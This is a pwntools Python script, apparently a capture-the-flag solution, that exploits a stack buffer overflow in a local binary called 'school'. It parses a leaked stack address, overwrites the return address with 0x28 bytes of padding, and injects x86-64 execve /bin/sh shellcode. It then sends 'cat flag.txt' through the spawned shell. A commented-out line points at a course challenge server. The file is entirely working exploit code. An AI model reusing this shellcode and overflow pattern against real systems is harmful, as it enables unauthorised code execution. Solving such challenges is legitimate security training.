from pwn import *
p = process('./school')
# p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1338)
# p.recvuntil(':')
# p.sendline("krm504")

p.recvuntil("at: ")
schoolsAt = int(p.recvuntil('.', drop=True), 16)
print("School's at: " + hex(schoolsAt))
p.recvuntil("directions:") # Clean up stdout

print("Generating Shellcode")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sploit = 'A'*0x28 + p64(schoolsAt+0x30) + shellcode

print(len(sploit))

print("Sending Shellcode")
p.sendline(sploit)

print("Now getting flag")
p.sendline("cat flag.txt")
#print(p.recvall())
print(p.recvuntil('}'))
